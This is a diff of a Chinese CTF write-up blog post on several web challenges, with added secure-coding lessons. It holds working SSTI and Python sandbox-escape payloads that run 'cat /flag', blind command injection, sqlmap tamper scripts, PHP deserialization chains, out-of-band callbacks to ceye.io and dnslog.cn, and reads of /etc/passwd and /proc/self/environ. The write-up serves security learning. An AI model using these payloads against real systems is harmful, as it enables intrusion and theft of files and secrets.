@@ -6,9 +6,9 @@ tags: ['ctf']
 comments: true
 ---
 
-## 琪露诺计算器(200pt)
+## 琪露诺的完美算术教室
 
-提交payload `{{ 7*7 }}`。服务器返回了 49，而不是 `{{ 7*7 }}` 字符串。这证实了模板引擎正在执行我们的输入，确认为SSTI漏洞。根据 {{}} 语法，可以初步判断为Flask/Jinja2或PHP/Twig环境。
+提交payload `{{ 7*7 }}`。服务器返回了 49，而不是 `{{ 7*7 }}` 字符串。确认为SSTI漏洞。根据 {{}} 语法，可以初步判断为Flask/Jinja2 或 PHP/Twig 环境。
 
 ```txt
 {{ g }}
@@ -165,7 +165,9 @@ drwxr-xr-x 1 root root 4096 Aug 11 00:00 var
 我知道了! 答案是 /fL1G_9: 1: VIDAR{Y0u_aR3_a_ReA1_G3n1Us_!!!}: not found !哼哼, 不愧是我~
 ```
 
-## 红魔馆
+启示： 永远不要将用户输入直接拼接到模板字符串，而是`render_template("template.html", user_data=expression)`。黑名单过滤是不可靠的。
+
+## 魔理沙借书之旅
 
 ```python
 from flask import Flask, request
@@ -315,7 +317,7 @@ print(int.__mro__[1].__subclasses__()[351]('cat /flag', shell=True, stdout=-1).c
 # 这样似乎不行: 做不到这个: open
 ```
 
-SandboxVisitor 这个类，就是直接定义在主程序脚本的顶层。这意味着，它的任何一个方法（比如 visit_Import），其 __globals__ 属性都会直接指向主程序的全局命名空间
+SandboxVisitor 这个类，就是直接定义在主程序脚本的顶层。这意味着，它的任何一个方法（比如 visit_Import），其 `__globals__` 属性都会直接指向主程序的全局命名空间
 
 ```python
 print([i for i in range(len(().__class__.__base__.__subclasses__())) if 'SandboxVisitor' in ().__class__.__base__.__subclasses__()[i].__name__])
@@ -324,15 +326,15 @@ print([i for i in range(len(().__class__.__base__.__subclasses__())) if 'Sandbox
 
 这个 payload 没有返回任何东西.
 
-代码首先在主进程中被 ast.parse() 解析。
+代码首先在主进程中被 `ast.parse()` 解析。
 
-SandboxVisitor().visit(tree) 也在主进程中运行，用来检查 import 语句。
+`SandboxVisitor().visit(tree)` 也在主进程中运行，用来检查 import 语句。
 
-然后，程序创建了一个新的子进程 (p = multiprocessing.Process(...)) 来执行 sandbox_executor 函数。
+然后，程序创建了一个新的子进程 `(p = multiprocessing.Process(...))` 来执行 `sandbox_executor` 函数。
 
-payload 是在 exec() 中，也就是在那个新的子进程里运行的
+payload 是在 `exec()` 中，也就是在那个新的子进程里运行的
 
-SandboxVisitor 这个类是在主进程中定义和使用的。当子进程被创建时，它虽然继承了代码，但它的内存空间和加载的类是相对独立的。由于 SandboxVisitor 类从未在子进程的代码路径中被直接引用或实例化，Python 的垃圾回收机制可能已经清理了它，或者它根本就没有被完全加载到子进程的 __subclasses__ 列表里。
+`SandboxVisitor` 这个类是在主进程中定义和使用的。当子进程被创建时，它虽然继承了代码，但它的内存空间和加载的类是相对独立的。由于 `SandboxVisitor` 类从未在子进程的代码路径中被直接引用或实例化，Python 的垃圾回收机制可能已经清理了它，或者它根本就没有被完全加载到子进程的 `__subclasses__` 列表里。
 
 ```python
 print([i for i in range(len(int.__mro__[1].__subclasses__())) if '_wrap_close' in str(int.__mro__[1].__subclasses__()[i])])
@@ -387,19 +389,19 @@ class _wrap_close:
         return iter(self._stream)
 ```
 
-发现 通过 _wrap_close 访问到的 popen 同样是使用 subprocess.Popen 实现，在这个过程中会触发 open
+发现 通过 `_wrap_close` 访问到的 `popen` 同样是使用 `subprocess.Popen` 实现，在这个过程中会触发 `open`
 
-我们不需要关心父进程中的 SandboxVisitor，因为我们的代码最终是在子进程中 exec 的。我们需要攻击的是子进程中的安全措施。
+我们不需要关心父进程中的 `SandboxVisitor`，因为我们的代码最终是在子进程中 `exec` 的。我们需要攻击的是子进程中的安全措施。
 
-既然 sys.addaudithook 是最终的防线，那么我们能不能在执行恶意代码（比如 Popen）之前，先把这个钩子给干掉呢？
+既然 `sys.addaudithook` 是最终的防线，那么我们能不能在执行恶意代码（比如 Popen）之前，先把这个钩子给干掉呢？
 
-sys.addaudithook 添加的钩子函数都存储在一个列表里：sys.audit_hooks。如果我们能拿到 sys 模块的引用，然后执行 sys.audit_hooks.clear()，那么所有的运行时安全检查就都失效了
+`sys.addaudithook` 添加的钩子函数都存储在一个列表里：`sys.audit_hooks`。如果我们能拿到 sys 模块的引用，然后执行 `sys.audit_hooks.clear()`，那么所有的运行时安全检查就都失效了
 
-虽然 limited_builtins 里没有 sys，但Python进程启动时，为了正常运行，已经加载了很多标准库模块。这些模块中的类，以及这些类所持有的 __globals__（全局变量字典），就是我们的把手
+虽然 `limited_builtins` 里没有 `sys`，但 Python 进程启动时，为了正常运行，通常已经加载了很多标准库模块。这些模块中的类，以及这些类所持有的 `__globals__`（全局变量字典），就是我们的把手
 
-__globals__ 属性是一个包含了函数或类所在模块所有全局变量的字典。如果我们可以找到一个已经加载的、属于标准库的类，那么通过它的 __globals__ 属性，我们就能访问到那个模块导入的所有其他模块，其中通常就包括 sys
+`__globals__` 属性是一个包含了函数或类所在模块所有全局变量的字典。如果我们可以找到一个已经加载的、属于标准库的类，那么通过它的 `__globals__` 属性，我们就能访问到那个模块导入的所有其他模块，其中通常就包括 `sys`
 
-一个很常见的“跳板”是 warnings.catch_warnings 类，因为它基本上总会被加载。
+一个常见的跳板是 `warnings.catch_warnings` 类，因为它基本上总会被加载。
 
 ```python
 print([i for i in range(len(().__class__.__base__.__subclasses__())) if 'catch_warnings' in ().__class__.__base__.__subclasses__()[i].__name__])
@@ -429,9 +431,9 @@ code=print([c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '
 # 32512
 ```
 
-发送的 payload 调用了 os.system() 并打印了它的返回值。在 Linux 系统上，os.system() 的返回值是命令的退出状态码经过位移运算后的结果。
+发送的 payload 调用了 `os.system()` 并打印了它的返回值。在 Linux 上，`os.system()` 的返回值是**命令的退出状态码经过位移运算**后的结果。
 
-我们执行的命令是 $(cat /flag)。
+我们执行的命令是 `$(cat /flag)`。
 
 Shell 无法找到名为 flag 内容的命令，因此退出码是 127 (command not found)。
 
@@ -439,7 +441,7 @@ os.system 将这个退出码 127 左移8位，即 127 << 8。
 
 127 * 256 = 32512。
 
-output = sys.stdout.getvalue() 这一行。代码只获取了标准输出 (stdout) 的内容，而完全忽略了标准错误 (stderr) 的内容
+`output = sys.stdout.getvalue()` 这一行。代码只获取了标准输出 (stdout) 的内容，而完全忽略了标准错误 (stderr) 的内容
 
 ```python
 code=[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close'][0].__init__.__globals__['__builtins__']['__import__']('os').system('cat /flag')
@@ -452,7 +454,7 @@ VIDAR{marisa_need_your_help!!!}192.168.3.217 - - [20/Aug/2025 13:51:35] "POST /e
 
 成功执行了，已经得到了一个无回显RCE. 现在需要想办法把它弄到http返回里
 
-试了下curl能用，直接用ceye.io远程回显了
+试了下curl能用，尝试用ceye.io远程回显了
 
 ```text
 POST /exec HTTP/1.1
@@ -470,7 +472,7 @@ code=[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_
 
 ```
 
-自己机器上开开心心拿到flag了，到靶场发现靶机不能访问外网。所以我们现在使用盲注。
+自己机器上试的时候开开心心拿到flag了，到靶场发现靶机不能访问外网。所以我们现在使用盲注，一个个字符试出 flag。
 
 ```python
 code=print([c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close'][0].__init__.__globals__['__builtins__']['__import__']('os').system('$(test "$(cat /flag | cut -c 1)" = "V")'))
@@ -610,9 +612,15 @@ if __name__ == "__main__":
 # 最终flag: {marisa_need_your_help!!!}
 ```
 
+启示： 无论何时永远不要尝试自己写一个沙箱，总有各种意想不到的语言特性可以用来逃逸。业务场景真的需要执行用户提交的代码，应该使用操作系统级别的隔离技术比如容器。注意错误信息的回显，对生产环境的错误进行统一封装，避免泄露堆栈跟踪
+
+## sqli 1
+
+sqlmap 秒了。
+
 ## sqli 2
 
-过滤了`information_schema`的`infor`, 默认的randomcase.py并不会处理information_schema。这里重新自己写一个脚本，用简单大小写替换绕过。
+多试了几次，发现过滤了`information_schema`的`infor`, sqlmap 默认的 tamper 插件 randomcase.py 并不会处理 information_schema。这里重新自己写一个脚本，用简单大小写替换绕过。
 
 ```python
 #!/usr/bin/env python
@@ -687,7 +695,7 @@ def tamper(payload, **kwargs):
 
 ```
 
-除了 information_schema, 还过滤了`-`,`=`,以及常见的一些关键字。sqlmap构造非法输入会首先试图使用负数id，我们不希望带上负数id的`-`，所以加上`--invalid-string`参数。它会使用非法字符串而不是非法id。使用`#`结尾。
+除了 information_schema, 还过滤了`-`,`=`,以及常见的一些关键字。sqlmap 构造时非法输入会首先试图使用负数id，我们不希望带上负数id的`-`，所以加上`--invalid-string`参数。它会使用非法字符串而不是非法id。使用`#`结尾。因此我们的 sqlmap 指令如下：
 
 ```shell
 $ sqlmap -u "http://hgame.vidar.club:42368/books/0*" --tamper=equaltolike,"/home/veno/.local/share/sqlmap/tamper/randomcase.py" --risk=3 --level=5 --string="Vidar-Team" --prefix="'" --suffix="%23" --invalid-string -v 1 --batch --dbs
@@ -783,6 +791,26 @@ $ sqlmap -u "http://hgame.vidar.club:42368/books/0*" --tamper=equaltolike,"/home
 ## The Knife
 
 ```shell
+❯ curl http://hgame.vidar.club:44885/
+
+Welcome to my website<br><br>You want to get my secret,right???<br><br>But Now you cannot use the eval function in it<br><br>Try to find another place to get use of eval function!!!<br><br><html>
+<head>
+        <title>实验性website</title>
+        <meta charset="UTF-8">
+        <meta name="author" content="R1esbyfe">
+        <meta name="keywords" content="Challenge06">
+        <link rel="stylesheet" href="static/style.css">
+    </head>
+    <body>
+    <!--It seems that you are going to exploit the eval function, but now I have disabled it-->
+    <!--@eval($_POST['this_is_my_shell']);-->
+    <!--hint: 当你不知道站点有哪些文件可以利用，也许你需要找一些能够获取路径文件的工具-->
+    <!--当初这个站点被黑客们入侵了，好不容易修复完成，不知道黑客会不会在这里留下什么东西-->
+    <!--说实话我有点害怕，因为我根本不知道它们在哪，万一给找到了又利用起来了怎么办-->    
+    </body>
+</html>
+
+
 ❯ python dirsearch.py -u 'hgame.vidar.club:44885' -w ~/Downloads/CommonBackdoors-PHP.fuzz.txt
 /home/veno/Projects/dirsearch/lib/core/installation.py:24: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
   import pkg_resources
@@ -882,7 +910,7 @@ PHP 中，一些特殊函数被称为 "魔术方法" (Magic Methods)，它们以
 
 我们的目标是读取 `/flag` 文件。我们来分析 `mainclass.php` 中的 "小工具" 如何串联起来：
 
-- 终点 (Payload): Evil 类看起来最可疑。
+- 终点: Evil 类看起来最可疑。
 
 它有一个 `__get($Attribute)` 魔术方法。当我们试图读取这个类中一个不存在的属性时（例如`$evil_object->web`），这个方法就会被触发。
 
@@ -890,15 +918,15 @@ PHP 中，一些特殊函数被称为 "魔术方法" (Magic Methods)，它们以
 
 所以，我们的目标是触发 `Evil` 类的 `__get` 方法，并且要控制 `$this->file` 的值为 `/flag`。
 
-- 第二环 (Middle Gadget): 谁能触发 `Evil` 类的 `__get` 方法呢？
+- 第二环: 谁能触发 `Evil` 类的 `__get` 方法呢？
 
 看看 `GoGoGo` 类。它有一个 `__call($name, $arguments)` 魔术方法。当我们试图调用这个类中一个不存在的方法时（例如`$gogo_object->gogogo()`），这个方法会被触发。
 
 在 `__call` 方法内部，它执行了 `return $this->go->web`。这正好是去读取 `$this->go` 这个属性所指向的对象的 `web` 属性。
 
-如果我们让 `$this->go` 指向我们准备好的 `Evil` 对象，那么 `_call` 触发时，就会去执行 `$evil_object->web`，因为 `web` 属性在 `Evil` 类中不存在，所以就会完美地触发 `Evil` 类的 `__get` 方法！
+如果我们让 `$this->go` 指向我们准备好的 `Evil` 对象，那么 `_call` 触发时，就会去执行 `$evil_object->web`，因为 `web` 属性在 `Evil` 类中不存在，所以就会触发 `Evil` 类的 `__get` 方法
 
-- 起点 (The Trigger): 谁又能触发 `GoGoGo` 类的 `__call` 方法呢？
+- 起点: 谁又能触发 `GoGoGo` 类的 `__call` 方法呢？
 
 看看 `HereWeGo` 类。它有一个 `__destruct()` 魔术方法。这个方法在一个对象的所有引用都被删除或者脚本执行结束时自动调用。`unserialize()` 创建的对象在脚本执行完毕后就会被销毁，从而触发 `__destruct`。
 
@@ -969,10 +997,13 @@ echo $payload;
 
 在 notebook 中添加这个 payload，再访问 /flag.txt, 得到 base64 编码后的 flag。
 
+启示：不要反序列化不可信的数据，任何来自用户输入、Cookie、HTTP 头的数据都是不可信的。需要客户端和服务端交换结构化数据时，JSON 是首选，因为这些函数只会生成简单的数据类型，而不会实例化成对象。
 
 ## Ztype
 
-不让用 f12, 所以右键 view-source。
+打字版雷霆战机。题目说达到一定分数会有奖励。
+
+不让用 f12, 所以右键 view-source。首先去看看游戏结束的逻辑，一下看到了 flag。
 
 ```javascript
 // lib/game/menus/game-over.js
@@ -1009,7 +1040,7 @@ ig.module('game.menus.game-over').requires('game.menus.base', 'game.menus.inters
             });
             this.timer = new ig.Timer();
         },
-        // FLAG IS HERE!!!
+        // FLAG IS HERE!!! 这条注释我自己写的
         o: function()
         {
             const as = ['{', '_', '12', 'F', 'n0', '3_', 'r', 'm0', 'V', '}', 'id', 'ar'];
@@ -1145,7 +1176,7 @@ Content-Length: 1658
 </html>
 ```
 
-可以在响应中看到服务器是 gunicorn, 大概率是flask, 我觉得mini应该不会用django。首页的登陆啥都没写，只是原地TP, 所以找下有没有其他的 API. 用dirsearch 扫了一下 Seclists/Discovery/Web-Content/common.txt, 扫到了robots.txt, 看一下内容:
+可以在响应中看到服务器是 gunicorn, 大概率是 flask, 因为我觉得 mini 赛应该不会用 Django。首页的登陆啥都没写，空按钮只是原地 TP, 所以找下有没有其他的 API. 用dirsearch 扫了一下 Seclists/Discovery/Web-Content/common.txt, 扫到了robots.txt, 看一下内容:
 
 ```txt
 # robots.txt
@@ -1178,7 +1209,33 @@ Content-Length: 22
 Only admin can do this
 ```
 
-上面robots.txt里，标着session，但是怎么看都像是session的secret key而非session本身。但是之前的所有返回里我们也找不到响应里面哪里有 Set-Cookie 之类的响应头，可能服务端压根没写这块逻辑。
+上面 robots.txt 里，标着 session，但是怎么看都像是 session 的 secret key 而非 session 本身, 因为 flask session 一般不长这样。
+
+---
+
+flask session 一般长这样：`eyJ1c2VyX2lkIjoxfQ.C-vNVA.9dZqZJ_e9cqa7yW1aJcl1aY_fH4`
+
+分成三段，第一段是 payload, 先序列化，如果数据大就 zlib 压缩一次，之后 base64 编码。第二段是时间戳的 base64, 第三段是签名，是一个基于密钥的哈希消息认证码(HMAC)。这个签名可以防止用户篡改 session。但它是防篡改，不是防读取。因此：
+
+**启示：永远不要在 flask session 里放敏感信息。**
+
+当浏览器把这个 cookie 发送回服务器时，flask 会执行以下验证步骤：
+
+1. 从接收到的 cookie 中分离出前两段（有效载荷和时间戳）。
+
+2. 使用自己保存的 SECRET_KEY，对这两段重新执行一次完全相同的签名算法。
+
+3. 将新生成的签名与 cookie 中的第三段（原始签名）进行比较。
+
+- 如果两者完全一致，说明 session 数据从服务器发出后没有被任何人修改过，是可信的。flask 会解码第一段，恢复出 session 字典供代码使用。
+
+- 如果两者不一致，说明 cookie 的数据（例如，用户试图将 {"user_id":1} 修改为 {"user_id":99, "is_admin":true}）已经被篡改了。因为攻击者没有你的 SECRET_KEY，他们无法伪造出正确的签名。此时，Flask 会认为该 session 无效并直接丢弃它。
+
+---
+
+总之，这里看着一点都不是 flask session。说不定是题目自己实现了一个 session 验证？
+
+但是之前的所有返回里我们也找不到响应里面哪里有 set-cookie 之类的响应头，可能服务端压根没写这块逻辑。
 
 试试看能不能 POST / 得到一个 Cookie
 
@@ -1186,6 +1243,7 @@ Only admin can do this
 ❯ curl -X POST 'http://hgame.vidar.club:41279/' \
 --data 'username=test&password=test' \
 -v
+
 # Note: Unnecessary use of -X or --request, POST is already inferred.
 # * Host hgame.vidar.club:41279 was resolved.
 # * IPv6: (none)
@@ -1217,48 +1275,9 @@ Only admin can do this
 # * shutting down connection #0
 ```
 
-根路径不让 POST。想不到还能从哪里获取到 Cookie 了，尝试手动构造一下。
+根路径不让 POST。想不到还能从哪里获取到 Cookie 了
 
-```shell
-❯ python flask_session_cookie_manager3.py encode -s 'E:OH48NH`6f!1E6dco2c"hESB8UzwP"QlXAeA?TN!1E]F8Xj{7w2@yrj(T?W$DKU$w[bP' -t "{'admin': True}"
-# eyJhZG1pbiI6dHJ1ZX0.aKcyfg.17m0LgZ6O7Rz5NP-CWQ5sVYtgBc
-❯ python flask_session_cookie_manager3.py encode -s 'E:OH48NH`6f!1E6dco2c"hESB8UzwP"QlXAeA?TN!1E]F8Xj{7w2@yrj(T?W$DKU$w[bP' -t "{'is_admin': True}"
-# eyJpc19hZG1pbiI6dHJ1ZX0.aKcyrQ.jppQOyMfCwyMR2XikMvPYaFi_1o
-❯ python flask_session_cookie_manager3.py encode -s 'E:OH48NH`6f!1E6dco2c"hESB8UzwP"QlXAeA?TN!1E]F8Xj{7w2@yrj(T?W$DKU$w[bP' -t "{'role': 'admin'}"
-# eyJyb2xlIjoiYWRtaW4ifQ.aKczhQ.-CHb8YSltnUMtH-51LV3AAZdhvA
-❯ python flask_session_cookie_manager3.py encode -s 'E:OH48NH`6f!1E6dco2c"hESB8UzwP"QlXAeA?TN!1E]F8Xj{7w2@yrj(T?W$DKU$w[bP' -t "{'username': 'admin'}"
-# eyJ1c2VybmFtZSI6ImFkbWluIn0.aKczmg.X_FU4YhCc1iek3Qq3eyKlcjBXWs
-❯ python flask_session_cookie_manager3.py encode -s 'E:OH48NH`6f!1E6dco2c"hESB8UzwP"QlXAeA?TN!1E]F8Xj{7w2@yrj(T?W$DKU$w[bP' -t "{'user': 'admin'}"
-# eyJ1c2VyIjoiYWRtaW4ifQ.aKczsA.bPgFCxX7-Kze4g6MyrqdiAFQZlM
-❯ python flask_session_cookie_manager3.py encode -s 'E:OH48NH`6f!1E6dco2c"hESB8UzwP"QlXAeA?TN!1E]F8Xj{7w2@yrj(T?W$DKU$w[bP' -t "{'name': 'admin'}"
-# eyJuYW1lIjoiYWRtaW4ifQ.aKczwQ.oV4OtwUyNrUDKQF4Tofs45XHzjw
-```
-
-但是把这些得到的 session 扔进 Cookie: session=xxxx, 还是会提示 Only admin can do this. 真的把那个 `E:OH48xxx` 的东西扔进 Cookie 也是一样的。
-
-```txt
-GET /backdoor HTTP/1.1
-Host: hgame.vidar.club:41279
-Accept-Language: zh-CN,zh;q=0.9
-Upgrade-Insecure-Requests: 1
-Cookie: session=eyJhZG1pbiI6dHJ1ZX0.aKcyfg.17m0LgZ6O7Rz5NP-CWQ5sVYtgBc
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Accept-Encoding: gzip, deflate, br
-Connection: keep-alive
-
-
-HTTP/1.1 403 FORBIDDEN
-Server: gunicorn
-Date: Thu, 21 Aug 2025 15:33:39 GMT
-Connection: close
-Content-Type: text/html; charset=utf-8
-Content-Length: 22
-
-Only admin can do this
-```
-
-所以去问了出题人，发现自己想复杂了。题目hint：只需解密无需加密。可能说的就是解密这个session字符串。猜测可能是base91
+所以去问了出题人，发现自己想复杂了。题目 hint：只需解密无需加密。可能说的就是解密这个 session 字符串。直接扔到 cyberchef 里没解出来。仔细看看，猜测可能是 base91
 
 ```txt
 E:OH48NH`6f!1E6dco2c"hESB8UzwP"QlXAeA?TN!1E]F8Xj{7w2@yrj(T?W$DKU$w[bP
@@ -1418,8 +1437,9 @@ if __name__ == "__main__":
 
 [inhann - flask 漏洞利用小结](https://www.inhann.top/2021/02/25/flask_newer/#session-forgery)
 
-
 ## Easy Login
+
+说是防止爆破密码，搞了验证码。这里的问题和上面的 leavesongs 的博客一样，是把验证码放到 flask session 里了。敏感信息不能放在这里。而且附带了验证码图片的文件名，文件名也是验证码的 base64 编码。
 
 ```python
 #!/usr/bin/env python3
@@ -1653,7 +1673,7 @@ if __name__ == '__main__':
         print("\n\n[-] 所有密码组合已尝试完毕，未找到正确密码。")
 ```
 
-可以使用同一个Cookie和验证码是因为这里题目的验证码信息直接被放在了flask session的第一段。平常写代码可不能这么写。
+可以使用同一个Cookie和验证码是因为, 这里题目的验证码信息直接被放在了 flask session 的第一段。平常写代码可不能这么写。
 
 ```shell
 ❯ python main.py
@@ -1677,3 +1697,385 @@ if __name__ == '__main__':
 ```
 
 登陆就送flag.
+
+启示：
+
+1. 客户端 Session vs. 服务端 Session：
+
+    - 客户端 Session (如 Flask 默认)：数据存在浏览器 Cookie 里。优点是服务端无状态、易于扩展。缺点是 数据对用户透明（可解码），且大小受限。绝对不能存放任何敏感信息。
+
+    - 服务端 Session：数据存在服务器的内存、Redis 或数据库中，只在 Cookie 里存一个 session ID。这是存储验证码、用户权限等敏感信息的正确方式。
+
+2. 验证码的正确实现：
+
+正确的流程应该是：后端生成验证码 -> 将答案存入服务端 Session -> 将验证码图片返回给前端 -> 用户提交表单 -> 后端从服务端 Session 中取出正确答案进行比对。
+
+## Enjoy Coffee
+
+[Enjoy模板注入引擎分析](https://cxkjy.github.io/blog/Enjoy%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5.html)
+
+解压 jar, 反编译，发现只有一个关键路由。
+
+```java
+@RestController
+public class indexController {
+    @RequestMapping(value={"/"})
+    public String Index() {
+        return "Try to use Enjoy Template Engine.";
+    }
+
+    @RequestMapping(value={"/render"})
+    public String read(@RequestParam String tmpl) {
+        try {
+            Engine engine = Engine.use();
+            engine.setStaticMethodExpression(true);
+            Template template = engine.getTemplateByString(tmpl);
+            return template.renderToString();
+        }
+        catch (Exception e) {
+            return e.toString();
+        }
+    }
+}
+```
+
+根据 Enjoy 文档，我们只能直接调用静态方法，并且有一系列 Enjoy 自身的黑名单。
+
+黑名单类：
+
+```java
+System.class, 
+Runtime.class, 
+Thread.class, 
+Class.class, 
+ClassLoader.class, 
+File.class, 
+Compiler.class, 
+InheritableThreadLocal.class, 
+Package.class, 
+Process.class, 
+RuntimePermission.class, 
+SecurityManager.class, 
+ThreadGroup.class, 
+ThreadLocal.class, 
+Method.class, 
+Proxy.class, 
+ProcessBuilder.class, 
+MethodKit.class
+```
+
+黑名单方法：
+
+```java
+"getClass", 
+"getDeclaringClass", 
+"forName", 
+"newInstance", 
+"getClassLoader", 
+"invoke", 
+"notify", 
+"notifyAll", 
+"wait", 
+"exit", 
+"loadLibrary", 
+"halt", 
+"stop", 
+"suspend", 
+"resume", 
+"removeForbiddenClass", 
+"removeForbiddenMethod"
+```
+
+这里显然没有 fastjson 之类的第三方依赖，只能用 Java 自带类。
+
+尝试把文章里的利用 java.beans.Beans 的静态方法 instantiate 的 payload 直接拿过来试试
+
+```java
+#((java.beans.Beans::instantiate(null,"javax.script.ScriptEngineManager")).getEngineByExtension("js").eval(...))
+
+// com.jfinal.template.TemplateException: The target for method invoking can not be null, method name: eval String template line: 1
+```
+
+`(java.beans.Beans::instantiate(null,"javax.script.ScriptEngineManager"))`：这一部分使用 Beans.instantiate 创建了一个 javax.script.ScriptEngineManager 的实例。到这里应该是成功的
+
+`.getEngineByExtension("js")`：这一步是在上一步创建的 ScriptEngineManager 实例上调用 getEngineByExtension("js") 方法，期望获取一个 JavaScript 引擎。
+
+`.eval(...)`：这一步是在上一步获取到的 JavaScript 引擎上调用 eval 方法。这里 eval 的调用目标是 null, 说明上一步 `getEngineByExtension("js")` 这个方法的返回结果是 null, 说明服务器的 JDK 版本比较高，至少大于 JDK 15, 因为从 Java 15 开始，Nashorn JavaScript 引擎被移除了([JEP 372](https://openjdk.org/jeps/372)), 较新的 Java 环境中，`ScriptEngineManager` 默认是找不到名为 "js" 或 "javascript" 的脚本引擎的。博客里面是 Java 8 所以没这个问题。
+
+但至少 `java.beans.Beans::instantiate` 应该是可用的。
+
+```java
+#(java.net.InetAddress::getByName("6s62ln.dnslog.cn"))
+
+// com.jfinal.template.TemplateException: null String template line: 1
+```
+
+看了眼 dnslog.cn, 发现没反应，至少不能进行 dns 解析，猜测还是连不了外网，不能想着反弹 shell 什么的。
+
+先试试比较常见的，博客所说的黑名单里没提到的文件读取类。
+
+```java
+#(java.nio.file.Files::readAllLines(java.nio.file.Paths::get("/etc/passwd")))
+
+/*
+[
+    root:x:0:0:root:/root:/bin/bash, 
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin, 
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin, 
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin, 
+    sync:x:4:65534:sync:/bin:/bin/sync, 
+    games:x:5:60:games:/usr/games:/usr/sbin/nologin, 
+    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin, 
+    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin, 
+    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin, 
+    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin, 
+    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin, 
+    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin, 
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin, 
+    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin, 
+    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin, 
+    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin, 
+    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin, 
+    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin, 
+    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin, 
+    ctf:x:1000:1000::/home/ctf:/bin/bash
+]
+（已美化输出）
+*/
+```
+
+能读。用户名是 ctf。读了一下 /flag, /fl4g, /flag.txt, /fl4g.txt, 都没有东西。尝试一下列出目录。
+
+```java
+#(java.nio.file.Files::list(java.nio.file.Paths::get("/home/ctf")))
+
+// java.util.stream.ReferencePipeline$Head@472af847
+```
+
+`Files.list(Path directory)`: 这个方法列出一个目录下的所有文件和子目录，并返回一个 `Stream<Path>`
+
+想办法把流转为列表或者字符串。`java.util.stream.Collectors`
+
+```java
+#(java.nio.file.Files::list(java.nio.file.Paths::get("/home/ctf")).collect(java.util.stream.Collectors::joining(",")))
+
+// com.jfinal.template.stat.ParseException: Expression error: can not match "." String template line: 1
+
+#set(fileStream = java.nio.file.Files::list(java.nio.file.Paths::get("/home/ctf")))
+#(fileStream.collect(java.util.stream.Collectors::toList()))
+
+// com.jfinal.template.TemplateException: Unable to make public final java.lang.Object java.util.stream.ReferencePipeline.collect(java.util.stream.Collector) accessible: module java.base does not "opens java.util.stream" to unnamed module @12d3a4e9 String template line: 1
+```
+
+模板引擎使用反射来调用 Java 方法，但 Java 9 以后系统核心的模块（比如包含 Stream 的 java.base 模块）默认不允许外部代码通过反射来调用它们的内部构件([JEP 261](https://openjdk.org/jeps/261)), 默认都是强封装，必须明确定义 opens 关键字才能反射。所以返回 Stream 对象的方法不能从这条路子处理。
+
+随便再读读看别的地方的文件。
+
+```txt
+// /proc/self/environ
+
+[
+    SHELL=/bin/bash
+    KUBERNETES_SERVICE_PORT_HTTPS=443
+    KUBERNETES_SERVICE_PORT=443
+    HOSTNAME=ret2shell-162-44-1756992131
+    JAVA_HOME=/usr/local/openjdk-17
+    PWD=/appLOGNAME=ctf
+    HOME=/home/ctf
+    LANG=C.UTF-8
+    KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
+    USER=ctf
+    SHLVL=0
+    KUBERNETES_PORT_443_TCP_PROTO=tcp
+    KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
+    KUBERNETES_SERVICE_HOST=10.43.0.1
+    KUBERNETES_PORT=tcp://10.43.0.1:443
+    KUBERNETES_PORT_443_TCP_PORT=443
+    PATH=/usr/local/openjdk-17/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+    MAIL=/var/mail/ctf
+    JAVA_VERSION=17.0.2_=/usr/local/openjdk-17/bin/java
+]
+
+// /proc/self/cmdline
+
+[/usr/local/openjdk-17/bin/java-jar/app/EnjoyCoffee.jar--server.port=80] 
+```
+
+关键信息： JDK17, PWD=/app, JDK17 验证了之前 JDK 版本至少高于 15 的想法。
+
+在 /app 里找找看 flag。/app/flag, /app/flag.txt, /app/fl4g, /app/fl4g.txt 都没找到。
+
+既然博客里面说的 JS 引擎不能用了，那就看看有没有别的跳板，反正只要绕过 Enjoy 的黑名单就能 RCE。
+
+看眼 unzip 之后的 BOOT-INF/lib:
+
+```shell
+❯ tree BOOT-INF
+BOOT-INF
+├── classes
+│   └── enjoycoffee
+│       ├── controller
+│       │   └── indexController.class
+│       └── enjoycoffeeApplication.class
+├── classpath.idx
+├── layers.idx
+└── lib
+    ├── enjoy-5.1.3.jar
+    ├── jackson-annotations-2.15.3.jar
+    ├── jackson-core-2.15.3.jar
+    ├── jackson-databind-2.15.3.jar
+    ├── jackson-datatype-jdk8-2.15.3.jar
+    ├── jackson-datatype-jsr310-2.15.3.jar
+    ├── jackson-module-parameter-names-2.15.3.jar
+    ├── jakarta.annotation-api-2.1.1.jar
+    ├── jul-to-slf4j-2.0.9.jar
+    ├── log4j-api-2.21.1.jar
+    ├── log4j-to-slf4j-2.21.1.jar
+    ├── logback-classic-1.4.14.jar
+    ├── logback-core-1.4.14.jar
+    ├── micrometer-commons-1.12.1.jar
